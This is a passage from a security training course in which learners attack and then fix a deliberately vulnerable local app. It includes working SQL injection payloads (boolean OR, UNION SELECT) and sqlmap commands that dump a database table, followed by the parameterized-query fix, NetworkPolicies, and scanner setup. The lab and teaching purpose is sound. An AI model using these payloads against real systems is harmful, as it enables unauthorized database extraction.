# Act 4: Cybersecurity Engineer (Episodes 20 to 25)

## Your assignment

| | |
|---|---|
| Role | New Cybersecurity Engineer |
| Previously | The DevOps team deployed the app to Kubernetes with GitOps, autoscaling, and monitoring. |
| Task | The backend ships a search endpoint that builds SQL from user input, nobody has tested it, and no part of the app checks who is allowed to change what. |
| Goal | Think and act like an attacker to find the SQL injection, then switch hats and fix it, prove the fix with automated scans, find and fix a second real flaw, and put the app's secrets safely in Git. |
| Done when | `sqlmap` finds nothing on the fixed endpoint, a Pod without an allow rule cannot reach the database, Semgrep, Trivy, and ZAP all run clean or with recorded findings, one user can no longer modify another's task, and every secret the app needs is a committed `SealedSecret`. |
| Start here | Fork the starter repository. Copy the contents of `act-3-devops-engineer/` from the `solved` branch to the root of your fork, not the folder itself. Replace files that have the same name. Do not replace the starter `tools/` folder. Install Docker Desktop and Minikube. You need a second Minikube profile for the policy check in Episode 22. |

Try each task first. Open **Show solution** for that task only when you are stuck. The last line in each solution links to the `solved` branch. Use that link as a last resort.

### If you skipped Act 3

Every task in this act runs against the task board inside a Minikube cluster, in the `app` namespace. Act 3 builds that cluster. Do these steps once, from the root of your fork, after you copy the contents of `act-3-devops-engineer/`. You do not need ArgoCD or the monitoring stack for this act.

1. Copy two files from the starter repository into your fork: `kubernetes/sealed-secrets/controller.yaml` and `kubernetes/app/07-networkpolicy.yaml`. The act-3 snapshot does not include them.

2. Start Minikube with Calico. Calico enforces the NetworkPolicies that you write in Episode 22. The default network plugin ignores them without an error. Act 3 does this in [Task 1](act3-devops-engineer.md#task-1-start-the-cluster).

   ```shell
   minikube start --driver=docker --cni=calico --cpus=6 --memory=6144
   minikube addons enable metrics-server
   ```

3. Change the images to local tags. The snapshot points at the course's published GHCR images. This act rebuilds the backend and frontend on your laptop, so the cluster must run your local builds.
   - In `kubernetes/app/03-postgres.yaml`, set the `postgres` container image to `tutorial-database:local`.
   - In `kubernetes/app/04-deployments.yaml`, set the `frontend` container image to `tutorial-frontend:local`.
   - In the same file, set the `backend` container image to `tutorial-backend:local`.

4. Build the images and load them into Minikube. Minikube has its own container runtime. It cannot see the images in Docker Desktop until you copy them in with `minikube image load`. Act 3 does this in [Task 8](act3-devops-engineer.md#task-8-build-and-load-the-local-images).

   ```shell
   docker build -t tutorial-frontend:local ./frontend
   docker build -t tutorial-backend:local ./backend
   docker build -t tutorial-database:local ./database
   minikube image load tutorial-frontend:local
   minikube image load tutorial-backend:local
   minikube image load tutorial-database:local
   ```

5. Create the namespace and the database Secret. Keep the username `tutorial`. Replace `choose-a-password` with your own password. You create the Secret by hand so that the password never enters Git. Episode 25 replaces it with a `SealedSecret`. Act 3 does this in [Task 9](act3-devops-engineer.md#task-9-create-the-namespace-and-the-database-secret).

   ```shell
   minikube kubectl -- apply -f kubernetes/app/namespace.yaml
   minikube kubectl -- create secret generic app-db -n app --from-literal=username=tutorial --from-literal=password=choose-a-password --dry-run=client -o yaml | minikube kubectl -- apply -f -
   ```

6. Apply the app manifests. Warning: do not apply `07-networkpolicy.yaml` yet. It denies all traffic until Episode 22 adds the allow rules. Act 3 does this in [Task 10](act3-devops-engineer.md#task-10-apply-the-manifests).

   ```shell
   minikube kubectl -- apply -n app -f kubernetes/app/01-configmap.yaml
   minikube kubectl -- apply -n app -f kubernetes/app/02-services.yaml
   minikube kubectl -- apply -n app -f kubernetes/app/03-postgres.yaml
   minikube kubectl -- apply -n app -f kubernetes/app/04-deployments.yaml
   minikube kubectl -- apply -n app -f kubernetes/app/05-hpa.yaml
   ```

7. Check that every Pod is `Running`:

   ```shell
   minikube kubectl -- get pods -n app
   ```

Without ArgoCD, nothing applies your manifest changes for you. In Task 38, apply `kubernetes/app/04-deployments.yaml` with `minikube kubectl -- apply -n app -f` before you restart the backend.

## What a Cybersecurity Engineer does

A Cybersecurity Engineer finds and closes security gaps before someone else finds them first. In a team, you:

- Test your own systems under a written scope, never someone else's.
- Think like an attacker: read the code and the traffic, then try to break it.
- Fix the root cause, not just the symptom.
- Apply least privilege: a workload gets only the access it needs.
- Run automated scans so a fix stays fixed after the next commit.

Job titles: Penetration Tester, Security Engineer, Application Security (AppSec) Engineer.

## Rules of engagement

Read this before Episode 20. It applies to every hands-on step in this act.

- Test only `127.0.0.1` and `localhost`, or your own Minikube cluster's internal network, never anything reachable from outside your laptop.
- Never point any tool in this act at a host you do not own.
- `sqlmap`, ZAP, and the manual payloads in this act exist to teach you how an attacker finds a flaw that is already in this starter repository, on purpose, for you to fix.
- Run `sqlmap` and ZAP as one-off Pods inside the cluster, not from a container on your laptop. A container reaching your laptop's `kubectl port-forward` needs the forward bound to every network interface, which also exposes the vulnerable endpoint to your local network. Running the tool inside the cluster, against the app's own Service name, avoids this entirely.

## What you build

You find and fix a SQL injection in the backend you built in Act 1, harden the Kubernetes workloads you built in Act 3, find and fix a second real vulnerability, then put the app's secrets safely in Git.

| Episode | Topic | Focus | What you do |
|---|---|---|---|
| 20 | Think like an attacker | Penetration Tester | Write a scope, map the API with curl, map the attack surface with Burp Suite |
| 21 | Exploit the SQL injection | Penetration Tester | Confirm the injection by hand, extract data with `sqlmap` |
| 22 | Fix and harden | Security Engineer (defensive) | Parameterize the query, add NetworkPolicies |
| 23 | Scan and verify | Security Engineer (AppSec) | Run Semgrep, Trivy, and ZAP against the fixed app |
| 24 | Broken access control | Security Engineer (defensive) | Add real users (bcrypt, JWT), reproduce an IDOR on `DELETE /api/tasks/<id>`, fix it with an ownership check |
| 25 | Encrypt secrets for Git | DevOps Engineer | Install Sealed Secrets, seal `app-db` and `app-auth`, let ArgoCD manage them |

## What the starter gives you

| Path | Content |
|---|---|
| `tools/sqlmap/Dockerfile` | A small image built from the official `sqlmap` source, for Episode 21 |
| `tools/zap/rules.tsv` | A ZAP baseline rule config that silences two informational findings, for Episode 23 |
| `tools/compose.yaml` | Adds the `sqlmap`, `semgrep`, `trivy`, `latex`, and `kubeseal` services. ZAP runs as a Pod inside Minikube instead of through Compose; see Episode 23 |
| `kubernetes/sealed-secrets/controller.yaml` | The vendored Sealed Secrets controller manifest, for Episode 25 |
| `kubernetes/app/07-networkpolicy.yaml` | The default-deny policy and the DNS egress allow rule, complete. No app-specific rules yet |

You write everything else: the fixed search query, pentest notes, the app-specific NetworkPolicy allow rules (ingress and egress, port and label values; the default-deny and DNS rules are already there), a Semgrep rule, a security scan workflow, the Nginx security headers, real users with bcrypt and JWT, the ownership check, and the sealed `app-db` and `app-auth` secrets.

Compare your work with `act-4-cybersecurity-engineer/` in the `solved` branch.

## Pull the new images

#### Task 1: Pull the course images

Pull the Semgrep, Trivy, ZAP, and LaTeX images.

<details>
<summary>Show solution</summary>

```shell
docker pull semgrep/semgrep
docker pull aquasec/trivy
docker pull ghcr.io/zaproxy/zaproxy:stable
docker pull texlive/texlive
```

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 2: Load ZAP into Minikube

Load ZAP into the Minikube node. The image is about 1.2 GB and can take several minutes to download. The scan Pod must not spend that time pulling it.

<details>
<summary>Show solution</summary>

```shell
minikube image load ghcr.io/zaproxy/zaproxy:stable
```

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 3: Build and load sqlmap

`sqlmap` has no official image. Build it once, then load it into Minikube. Minikube cannot see the images in Docker Desktop, so `minikube image load` copies the image into the cluster. Act 3 loads the app images the same way in [Task 8](act3-devops-engineer.md#task-8-build-and-load-the-local-images).

<details>
<summary>Show solution</summary>

```shell
docker compose -f tools/compose.yaml build sqlmap
minikube image load tools-sqlmap:local
```

Last resort: [open the solved sqlmap Dockerfile](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/tools/sqlmap/Dockerfile)

</details>

## Reach the backend directly (episodes 20 to 21)

#### Task 4: Start the port-forward

Keep the port-forward running in its own terminal, for the manual `curl` commands only. `kubectl port-forward` opens a tunnel from `127.0.0.1` on your laptop to a Service inside the cluster. Act 3 uses the same pattern for Prometheus in [Task 19](act3-devops-engineer.md#task-19-deploy-and-check-prometheus). If port 8000 is in use, forward to 18000 and use 18000 in the curl URLs.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- port-forward service/backend -n app 8000:8000
```

`sqlmap` and ZAP do not use this port-forward. Both run as Pods inside the cluster. `sqlmap` reaches the backend at `backend.app.svc.cluster.local:8000`, the backend Service's in-cluster DNS name. Inside the cluster, every Service has the name `<service>.<namespace>.svc.cluster.local`. Prometheus scrapes the same name in Act 3, [Task 18](act3-devops-engineer.md#task-18-add-prometheus-scrape-targets). ZAP reaches the frontend at `frontend.app.svc.cluster.local:80`, because the checks in Episode 23 are response headers, and those come from Nginx.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

## Think like an attacker (episode 20)

#### Task 5: Write the scope

Write a one-page scope before you touch the app: the target (`http://localhost:8000`, your own Minikube cluster), what is in scope (the API, the frontend), what is out of scope (anyone else's systems), and when you will stop.

<details>
<summary>Show solution</summary>

Use this template:

```text
Target: http://localhost:8000, my own Minikube cluster
In scope: the API and the frontend
Out of scope: any system I do not own
Stop condition: when I have confirmed or ruled out the SQL injection, or after 30 minutes
```

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 6: Read the API with curl

Read the API by hand. Call `healthz`, `readyz`, the task list, and the search endpoint. If you forwarded to 18000, use 18000 in these URLs.

<details>
<summary>Show solution</summary>

```shell
curl http://localhost:8000/healthz
curl http://localhost:8000/readyz
curl http://localhost:8000/api/tasks
curl "http://localhost:8000/api/tasks/search?q=groceries"
```

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 7: Map the attack surface with Burp Suite

Install Burp Suite Community Edition on the host. Point your browser's proxy at Burp. Browse the frontend. Build a site map of every request the app makes.

<details>
<summary>Show solution</summary>

Burp Suite Community Edition is a GUI intercepting proxy. It cannot run headless in a container for this interactive step, so install it on the host, the same way you installed VS Code and Docker Desktop in [Setup](00-setup.md#macos) ([Windows](00-setup.md#windows-1011)): download the installer and run it on your laptop, not in a container. Set Burp's proxy listener to `127.0.0.1:8080`. Point the browser at it. Open the frontend, create a task, search for it, mark it done, delete it. Open Burp's site map.

The requests to find: `GET /`, `GET /api/tasks`, `POST /api/tasks`, `PATCH /api/tasks/<id>`, and `GET /api/tasks/search`.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

## Exploit the SQL injection (episode 21)

The search endpoint builds SQL with an f-string:

```python
tasks = connection.execute(
    f"SELECT id, title, done FROM tasks WHERE title LIKE '%{term}%' ORDER BY id DESC"
).fetchall()
```

#### Task 8: Confirm the error

Send a single quote in the `q` parameter. The app's global error handler turns the resulting database error into a 503.

<details>
<summary>Show solution</summary>

```shell
curl -i -G http://localhost:8000/api/tasks/search --data-urlencode "q=groceries'"
```

Expected: `HTTP/1.1 503`. A normal, unmatched search returns `200` with an empty list, not `503`.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 9: Confirm with a boolean payload

Confirm the injection with a payload that closes the quoted string and adds a condition that is always true.

<details>
<summary>Show solution</summary>

```shell
curl -G http://localhost:8000/api/tasks/search --data-urlencode "q=nonexistent' OR '1'='1' --"
```

Expected: every task comes back, not zero. The search term never matched; the injected condition did.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 10: Extract data with UNION

Extract data with a `UNION` payload. The query selects three columns, so the injected `SELECT` must return three values of compatible types.

<details>
<summary>Show solution</summary>

```shell
curl -G http://localhost:8000/api/tasks/search --data-urlencode "q=nonexistent' UNION SELECT 1, version(), true --"
```

Expected: one task comes back whose `title` is the PostgreSQL version string, not a task you created.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 11: Automate with sqlmap

Run `sqlmap` as a Pod in the `app` namespace, targeting the backend's Service name directly.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- run sqlmap-scan -n app --image=tools-sqlmap:local --image-pull-policy=Never --labels=app.kubernetes.io/name=scanner --restart=Never -- \
  -u "http://backend.app.svc.cluster.local:8000/api/tasks/search?q=test" --batch --level=2 --risk=1
minikube kubectl -- logs sqlmap-scan -n app
minikube kubectl -- delete pod sqlmap-scan -n app
```

Expected: `sqlmap` reports the `q` parameter is injectable: boolean-based blind, stacked queries, time-based blind, and UNION query.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 12: Dump the tasks table

PostgreSQL has no separate "databases" the way MySQL does from one connection. `sqlmap --dbs` lists schemas instead, and the app's tables live in the default `public` schema. List the `tasks` table, then dump it, giving each Pod a new name.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- run sqlmap-tables -n app --image=tools-sqlmap:local --image-pull-policy=Never --labels=app.kubernetes.io/name=scanner --restart=Never -- \
  -u "http://backend.app.svc.cluster.local:8000/api/tasks/search?q=test" --batch -D public --tables
minikube kubectl -- logs sqlmap-tables -n app

minikube kubectl -- run sqlmap-dump -n app --image=tools-sqlmap:local --image-pull-policy=Never --labels=app.kubernetes.io/name=scanner --restart=Never -- \
  -u "http://backend.app.svc.cluster.local:8000/api/tasks/search?q=test" --batch -D public -T tasks --dump
minikube kubectl -- logs sqlmap-dump -n app
minikube kubectl -- delete pod sqlmap-tables sqlmap-dump -n app
```

Expected: `sqlmap` prints every row of the `tasks` table: `id`, `title`, `done`, `created_at`.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 13: Write the pentest note

Write your findings in a short pentest note: the endpoint, the payload, and what it proved.

<details>
<summary>Show solution</summary>

```text
Endpoint: GET /api/tasks/search?q=
Payload: nonexistent' OR '1'='1' --
Result: every task returned, so the q parameter controls the WHERE clause
Next step: parameterize the query and re-test
```

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

### Common mistakes

| Symptom | Cause | Fix |
|---|---|---|
| `curl` hangs | The port-forward in its own terminal stopped | Restart it |
| `sqlmap` Pod stuck `ImagePullBackOff` | Image not loaded into this cluster, or `--image-pull-policy=Never` missing | Run `minikube image load tools-sqlmap:local` again |
| `sqlmap -D tasks` finds no tables | PostgreSQL lists schemas, not databases, for `--dbs`. The table lives in `public`, not a database named `tasks` | Use `-D public` |
| The UNION payload returns nothing | Column count or type does not match (`id`, `title`, `done`) | Match three columns: an integer, a string, a boolean |

## Fix and harden (episode 22)

#### Task 14: Fix the query

Replace the f-string with a parameterized query, the same pattern every other endpoint in this backend already uses.

<details>
<summary>Show solution</summary>

```python
tasks = connection.execute(
    "SELECT id, title, done FROM tasks WHERE title LIKE %s ORDER BY id DESC",
    (f"%{term}%",),
).fetchall()
```

Remove the `# Intentionally vulnerable to SQL injection; Act 4 finds and fixes this.` comment from `backend/app.py`. The comment is no longer true.

Last resort: [open the solved backend/app.py](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/app.py)

</details>

#### Task 15: Rebuild and verify the fix

Rebuild the backend image. Load the image into Minikube. Restart the Deployment. Re-run the boolean and UNION payloads and the `sqlmap` Pod.

<details>
<summary>Show solution</summary>

```shell
docker build -t tutorial-backend:local ./backend
minikube image load tutorial-backend:local
minikube kubectl -- rollout restart deployment/backend -n app
minikube kubectl -- rollout status deployment/backend -n app
```

Wait for the rollout to finish. Re-run the boolean and UNION `curl` commands from [Task 9](#task-9-confirm-with-a-boolean-payload) and [Task 10](#task-10-extract-data-with-union). Both must return an empty list. Re-run the `sqlmap` Pod from [Task 11](#task-11-automate-with-sqlmap) against the same URL. `sqlmap` must report that the parameter is not injectable. Do not run `sqlmap` through Compose against `host.docker.internal`. `kubectl port-forward` listens on `127.0.0.1` only.

Last resort: [open the solved backend/app.py](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/app.py)

</details>

#### Task 16: Add the NetworkPolicies

`kubernetes/app/07-networkpolicy.yaml` already has the default-deny policy for all ingress and egress in `app`. It also has the DNS egress allow rule for `kube-dns` on UDP and TCP port 53. Internal lookups keep working. It also has the `scanner` egress rule for the `sqlmap` and ZAP Pods. Add these allow rules to the same file:

- The frontend accepts ingress on port 80 from anywhere.
- The frontend sends egress to the backend on port 8000.
- The backend accepts ingress on port 8000 from the frontend Pods and the scanner Pods.
- The backend sends egress to the database on port 5432.
- The database accepts ingress on port 5432 from the backend Pods only.
- The `monitoring` namespace accepts ingress to the exporters: frontend port 9113, backend port 8000, and database port 9187.

The default-deny policy blocks egress too. A rule on the destination alone is not enough. Add the egress rule on the source Pod as well.

Use the labels in the manifests: `app.kubernetes.io/name: frontend`, `app.kubernetes.io/name: backend`, and `app.kubernetes.io/name: postgres`. A label such as `app: frontend` matches no Pod.

<details>
<summary>Show solution</summary>

Add these policies to `kubernetes/app/07-networkpolicy.yaml`:

```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: frontend
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: frontend
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - ports:
        - port: 80
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - port: 9113
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: backend
      ports:
        - port: 8000
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: backend
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: backend
  policyTypes:
    - Ingress
    - Egress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: frontend
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: scanner
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - port: 8000
  egress:
    - to:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: postgres
      ports:
        - port: 5432
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: postgres
spec:
  podSelector:
    matchLabels:
      app.kubernetes.io/name: postgres
  policyTypes:
    - Ingress
  ingress:
    - from:
        - podSelector:
            matchLabels:
              app.kubernetes.io/name: backend
      ports:
        - port: 5432
    - from:
        - namespaceSelector:
            matchLabels:
              kubernetes.io/metadata.name: monitoring
      ports:
        - port: 9187
```

Apply the file:

```shell
minikube kubectl -- apply -n app -f kubernetes/app/07-networkpolicy.yaml
```

Last resort: [open the solved 07-networkpolicy.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/07-networkpolicy.yaml)

</details>

#### Task 17: Verify the default-deny policy

Run a probe Pod with no allow rule in the cluster that already runs the app. The default-deny policy blocks its egress.

<details>
<summary>Show solution</summary>

```shell
minikube kubectl -- run probe --image=busybox -n app --rm -i --restart=Never -- wget -qO- --timeout=2 postgres.app.svc.cluster.local:5432
```

Expected: the probe times out. A Pod with no explicit allow rule cannot reach the database.

If you want to use a second profile, stop the main profile first. The second profile must have the app images, the `app-db` Secret, and the manifests. Without the images and the Secret, the database Pod does not run. The probe then times out because there is no database, not because of the policy.

```shell
minikube stop
minikube start -p act4-check --driver=docker --cni=calico --cpus=6 --memory=6144
minikube kubectl -p act4-check -- apply -f kubernetes/app/namespace.yaml
minikube kubectl -p act4-check -- create secret generic app-db -n app --from-literal=username=tutorial --from-literal=password=choose-a-password
minikube kubectl -p act4-check -- apply -n app -f kubernetes/app
minikube kubectl -p act4-check -- run probe --image=busybox -n app --rm -i --restart=Never -- wget -qO- --timeout=2 postgres.app.svc.cluster.local:5432
minikube delete -p act4-check
minikube start
```

Last resort: [open the solved 07-networkpolicy.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/kubernetes/app/07-networkpolicy.yaml)

</details>

### Common mistakes

| Symptom | Cause | Fix |
|---|---|---|
| Frontend cannot reach backend after the NetworkPolicies | No explicit allow rule between them | Add a policy that allows the frontend's labels to reach the backend's port |
| DNS lookups fail inside Pods | Default-deny also blocked `kube-dns` | Add an egress allow rule for UDP/TCP 53 to the `kube-system` namespace |

## Scan and verify (episode 23)

#### Task 18: Write the Semgrep rule

Write a rule in `tools/semgrep/sql-injection.yml` that flags an f-string passed to `.execute(`.

<details>
<summary>Show solution</summary>

```shell
mkdir -p tools/semgrep
```

```yaml
rules:
  - id: fstring-sql-query
    languages: [python]
    severity: ERROR
    message: Do not build a SQL query with an f-string. Use a parameterized query.
    patterns:
      - pattern: $CONN.execute(f"...")
```

Last resort: [open the solved Semgrep rule](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/tools/semgrep/sql-injection.yml)

</details>

#### Task 19: Run Semgrep

Run Semgrep against the backend. Expected: no findings on the fixed code.

<details>
<summary>Show solution</summary>

```shell
docker compose -f tools/compose.yaml run --rm semgrep \
  semgrep scan --config tools/semgrep/sql-injection.yml backend/
```

Temporarily reintroduce the f-string and run it again. Semgrep flags the line. Revert the change.

Last resort: [open the solved Semgrep rule](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/tools/semgrep/sql-injection.yml)

</details>

#### Task 20: Run Trivy

Run Trivy against the backend image, the Kubernetes manifests, and the repository secrets.

<details>
<summary>Show solution</summary>

```shell
docker build -t tutorial-backend:local ./backend

docker compose -f tools/compose.yaml run --rm trivy image tutorial-backend:local
docker compose -f tools/compose.yaml run --rm trivy config kubernetes/
docker compose -f tools/compose.yaml run --rm trivy fs --scanners secret .
```

Record any findings you do not fix. Not every finding needs a fix today; note why.

Last resort: [open the solved Act 4 folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer)

</details>

#### Task 21: Run ZAP

Run ZAP as a Pod in the `app` namespace. Target the frontend.

<details>
<summary>Show solution</summary>

Load the rules file as a ConfigMap:

```shell
minikube kubectl -- create configmap zap-rules -n app --from-file=rules.tsv=tools/zap/rules.tsv
```

Create `zap-scan-pod.yaml`:

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: zap-scan
  namespace: app
  labels:
    app.kubernetes.io/name: scanner
spec:
  restartPolicy: Never
  containers:
    - name: zap
      image: ghcr.io/zaproxy/zaproxy:stable
      imagePullPolicy: IfNotPresent
      command:
        - zap-baseline.py
        - -I
        - -t
        - "http://frontend.app.svc.cluster.local/"
        - -c
        - /zap/rules/rules.tsv
      volumeMounts:
        - name: rules
          mountPath: /zap/rules
        - name: wrk
          mountPath: /zap/wrk
  volumes:
    - name: rules
      configMap:
        name: zap-rules
    - name: wrk
      emptyDir: {}
```

Apply and run it:

```shell
minikube kubectl -- apply -f zap-scan-pod.yaml
minikube kubectl -- wait --for=jsonpath='{.status.phase}'=Succeeded pod/zap-scan -n app --timeout=300s
minikube kubectl -- logs zap-scan -n app
minikube kubectl -- delete pod zap-scan -n app
```

`-I` keeps the Pod successful when the only result is warnings. Without it, `zap-baseline.py` exits 2 and the Pod never reaches `Succeeded`.

Read the findings from the Pod log. Do not use `kubectl cp` after the scan: the container has exited, so `cp` cannot start a process in it.

The `wrk` volume is required even without `-r`. The image runs from `/zap/wrk`, and `zap-baseline.py` refuses to start with a file based option when that directory is not a mount.

The Pod carries the label `app.kubernetes.io/name: scanner`. The `scanner` NetworkPolicy lets that label reach the frontend on port 80 and the backend on port 8000. Without the label, the default-deny egress policy blocks the scan and the Pod fails with `Connect timed out`.

Expected before the header fix: the log lists `Missing Anti-clickjacking Header`, `X-Content-Type-Options Header Missing`, `Content Security Policy (CSP) Header Not Set`, `Permissions Policy Header Not Set`, and the Nginx version leak. The rules file silences two informational findings only: cacheable content and modern web application.

Last resort: [open the solved zap-scan-pod.yaml](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/zap-scan-pod.yaml)

</details>

#### Task 22: Write the security workflow

Add `.github/workflows/security.yml`. On every pull request, run Semgrep and Trivy. Use your own rule file, `tools/semgrep/sql-injection.yml`, in the Semgrep job. Keep ZAP as a manual, documented step by default.

<details>
<summary>Show solution</summary>

```yaml
name: Security

on:
  pull_request:
  push:
    branches:
      - main

permissions:
  contents: read

jobs:
  sast:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: |
          docker run --rm -v "$PWD:/src" semgrep/semgrep semgrep scan \
            --config p/python --config p/javascript --config p/dockerfile \
            --config /src/tools/semgrep/sql-injection.yml \
            --error /src/backend /src/frontend

  trivy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Scan config and secrets
        run: |
          docker run --rm -v "$PWD:/src" aquasec/trivy:latest fs \
            --scanners misconfig,secret --severity HIGH,CRITICAL --exit-code 1 /src
      - name: Scan images
        run: |
          for svc in backend frontend database; do
            docker build -t "$svc:scan" "./$svc"
            docker run --rm -v /var/run/docker.sock:/var/run/docker.sock \
              aquasec/trivy:latest image --severity CRITICAL --ignore-unfixed --exit-code 1 "$svc:scan"
          done
```

The solved reference also has an optional DAST job that starts the Compose stack and runs ZAP. Keep ZAP as a manual step by default.

Last resort: [open the solved security workflow](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/.github/workflows/security.yml)

</details>

#### Task 23: Add the Nginx headers

Add the security headers to the `server` block in `frontend/nginx.conf`.

<details>
<summary>Show solution</summary>

```nginx
server_tokens off;
add_header X-Content-Type-Options "nosniff" always;
add_header X-Frame-Options "DENY" always;
add_header Referrer-Policy "no-referrer" always;
add_header Content-Security-Policy "default-src 'self'; base-uri 'none'; form-action 'self'; frame-ancestors 'none'; object-src 'none'" always;
add_header Permissions-Policy "geolocation=(), camera=(), microphone=()" always;
```

Rebuild the frontend image. Load it into Minikube. Restart the Deployment:

```shell
docker build -t tutorial-frontend:local ./frontend
minikube image load tutorial-frontend:local
minikube kubectl -- rollout restart deployment/frontend -n app
minikube kubectl -- rollout status deployment/frontend -n app
```

Re-run the same ZAP Pod. Expected: the anti-clickjacking, `X-Content-Type-Options`, CSP, Permissions Policy, and version leak findings disappear. One Low finding remains, `Cross-Origin-*-Policy Header Missing or Invalid` (90004). Record it and leave it: those policies need every cross-origin resource to cooperate, and this app loads none. Keep the `base-uri`, `form-action`, and `object-src` CSP fallbacks. Without them ZAP raises `CSP: Failure to Define Directive with No Fallback` (10055).

Last resort: [open the solved nginx.conf](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/frontend/nginx.conf)

</details>

## Broken access control (episode 24)

#### Task 24: Add the Python packages

Add `bcrypt>=4.2,<5` and `PyJWT>=2.9,<3` to `backend/requirements.txt`.

<details>
<summary>Show solution</summary>

```text
bcrypt>=4.2,<5
PyJWT>=2.9,<3
```

Last resort: [open the solved requirements.txt](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/backend/requirements.txt)

</details>

#### Task 25: Add JWT_SECRET

Add `JWT_SECRET` to `.env`, `.env.example`, and the backend service in `compose.yaml`.

<details>
<summary>Show solution</summary>

`.env` and `.env.example`:

```text
JWT_SECRET=change-me-locally-too
```

The backend service in `compose.yaml`:

```yaml
    environment:
      DB_HOST: database
      DB_NAME: tasks
      DB_USER: tasks
      DB_PASSWORD: ${DB_PASSWORD:?Set DB_PASSWORD in .env}
      JWT_SECRET: ${JWT_SECRET:?Set JWT_SECRET in .env}
```

Act 1 copied `.env` from `.env.example` in [Episode 5, Task 5](act1-software-engineer.md#task-5-copy-the-environment-file). If you skipped Act 1, run `cp .env.example .env` once. If you change only the example, your `.env` does not change. Compose reads the variable from `.env` only when the service lists it.

Last resort: [open the solved .env.example](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/.env.example)

</details>

#### Task 26: Reset the database volume

Reset the database volume. Warning: this deletes all data in your local database.

<details>
<summary>Show solution</summary>

```shell
docker compose down -v
```

PostgreSQL runs `init.sql` only on an empty data directory. `docker compose up --build` alone keeps the old schema. The `users` table and the `owner_id` column do not appear.

Last resort: [open the solved init.sql](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/database/init.sql)

</details>

#### Task 27: Add the pentest page

Copy `pentest.html`, `pentest.css`, and `pentest.js` into `frontend/`. Add the three files to the `COPY` line in `frontend/Dockerfile`.

<details>
<summary>Show solution</summary>

Copy the three files from the solved branch:

- [pentest.html](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/frontend/pentest.html)
- [pentest.css](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/frontend/pentest.css)
- [pentest.js](https://github.com/aliAljaffer/four-hats/blob/solved/act-4-cybersecurity-engineer/frontend/pentest.js)

Update the `COPY` line in `frontend/Dockerfile`:

```dockerfile
COPY index.html styles.css app.js pentest.html pentest.css pentest.js /usr/share/nginx/html/
```

Last resort: [open the solved frontend folder](https://github.com/aliAljaffer/four-hats/tree/solved/act-4-cybersecurity-engineer/frontend)

</details>

#### Task 28: Add users and authentication

Add a `users` table, a `tasks.owner_id` column, `POST /api/auth/register` (bcrypt-hashed passwords), and `POST /api/auth/login` (a signed JWT). Require `Authorization: Bearer <token>` on every `/api/tasks*` route. Scope `list`, `create`, and `search` to `owner_id`.

